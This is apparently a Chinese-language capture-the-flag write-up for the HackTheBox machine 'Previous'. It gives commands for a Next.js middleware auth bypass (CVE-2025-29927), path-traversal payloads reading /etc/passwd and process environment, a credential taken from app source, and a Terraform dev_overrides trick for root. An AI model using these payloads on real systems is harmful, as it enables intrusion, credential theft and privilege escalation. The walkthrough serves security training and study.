{
  "id": 1765295646798.5999,
  "title": "HackTheBox Previous",
  "slug": "htb-previous",
  "date": "2025-09-12",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757650872500-05177446-1281-449c-9664-2cc795be16b6.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">nmap -T4 -v -A -Pn 10.10.11.83 -oN previous.txt\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757650883897-e1e0455d-e264-419e-93d7-322a0ebe93cc.png\" alt=\"\"></p>\n<h1>USER</h1>\n<p>80 port 点击任意按钮会进入登录框</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757650998008-5ed975f4-1d51-44e6-aa9b-a3d26d6b724b.png\" alt=\"\"></p>\n<h2>CVE-2025-29927</h2>\n<p>这里没 fuzz 到什么东西，发现了网站又 next.js，发现了这个</p>\n<p><a href=\"https://github.com/advisories/GHSA-f82v-jwr5-mffw\">https://github.com/advisories/GHSA-f82v-jwr5-mffw</a></p>\n<p>刚好网站的 next.js 为 15.2.2，那么又找到了这个</p>\n<p><a href=\"https://github.com/websecnl/CVE-2025-29927-PoC-Exploit.git\">https://github.com/websecnl/CVE-2025-29927-PoC-Exploit.git</a></p>\n<p>但是主站是测试是灭有这个洞的，试试其他的 api 看会不会有，在/api/download 可以看到 payload 为middleware:middleware:middleware:middleware:middleware 时候，是有漏洞的</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757657774675-69b4dc63-6b80-40d6-8c37-0c3d048a4014.png\" alt=\"\"></p>\n<p>用 yakit 测试一下，看返回需要一个参数来指定文件名，爆破一下</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757659566868-f96ce292-9d92-42aa-aabe-82e3ea37777b.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">ffuf -w /home/kali/dict/fuzzDicts/paramDict/AllParam.txt -u &quot;http://previous.htb/api/download?FUZZ=text.txt&quot; -H &quot;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&quot; -c -mc all -fc 400\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757659771691-861048e1-434c-45be-9b97-c717a902df54.png\" alt=\"\"></p>\n<h2>LFI</h2>\n<p>再抓包携带参数测试，发现 error 变成了无法找到，那应该有可以遍历其他目录</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757659808467-3ca565f1-d91c-4e55-8fab-0e6a2f2e7d7b.png\" alt=\"\"></p>\n<p>example=../../../etc/passwd 成功</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757659972766-2deb6301-071d-4041-9312-dd38bcc9be1f.png\" alt=\"\"></p>\n<p>通过../../../../proc/self/environ 可以查看当前进程的环境变量</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757660187419-2b3f29b1-f5c7-4a9b-ba32-4351da47ed21.png\" alt=\"\"></p>\n<p>可以看到启动路径为/app 路径下，所以我们可以查看 next.js 的目录框架</p>\n<p>可以看到关于 auth 认证在/api/auth/[...nextauth] 页面</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757660459335-45404cea-fe4f-4b6e-abd6-7d2ceccc0f2b.png\" alt=\"\"></p>\n<p>重新查看../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js，加 url 编码否则无法解析</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757660616984-8064d428-5a74-4c90-bbb0-2d3a70cee847.png\" alt=\"\"></p>\n<p>可以找到凭证 jeremy：MyNameIsJeremyAndILovePancakes</p>\n<p>那么就可以 ssh 直接登录了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757660786166-02b81b1d-8268-4d16-9ba2-e834003f070f.png\" alt=\"\"></p>\n<h1>ROOT</h1>\n<h2>Terraform</h2>\n<p>sudo -l 查看</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757660987159-453f80c1-c60c-4dad-8c9f-e4359e0a331c.png\" alt=\"\"></p>\n<p> Terraform 是一款由 HashiCorp 公司开发的开源工具，它使用基础设施即代码（Infrastructure as Code, IaC）的方式来帮助你管理和配置云服务及其他 IT 资源 </p>\n<p>但是这里还只允许我们使用特定的命令</p>\n<p>因为目录限制了/opt/examples 下寻找配置文件，这是/opt/examples/main.tf，而且没有权限修改</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757661782908-03f475db-a593-488e-89e5-3d6386d02a3b.png\" alt=\"\"></p>\n<p>但是可以给他设置环境变量，来绕过指定的配置文件</p>\n<p><a href=\"https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file\">https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file</a></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757661952140-8bd555ef-186f-4abd-a7b4-4428c470fde3.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">export TF_CLI_CONFIG_FILE=&quot;$HOME/.terraformrc-custom&quot;\n</code></pre>\n<p>我们先创建一个可以执行程序里面用来做 suid</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757662157364-609e44f7-9db0-446b-8cc5-d74699615cd4.png\" alt=\"\"></p>\n<pre><code class=\"language-bash\">provider_installation {\n  dev_overrides {\n    &quot;previous.htb/examples&quot; = &quot;/home/jeremy/exp&quot;\n  }\n  direct {}\n}\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757662420575-38eb2c21-fc82-45e9-8d11-94293af071ef.png\" alt=\"\"></p>\n<p>然后设置环境变量</p>\n<pre><code class=\"language-bash\">export TF_CLI_CONFIG_FILE=/home/jeremy/exp/exp.tf\n</code></pre>\n<p>然后执行</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757662689357-de8bbf5a-d51c-4bbe-aba4-1ebd2d12d6a5.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1757662734640-683e56e2-78ce-4727-ba5a-09bb94523d91.png\" alt=\"\"></p>\n"
}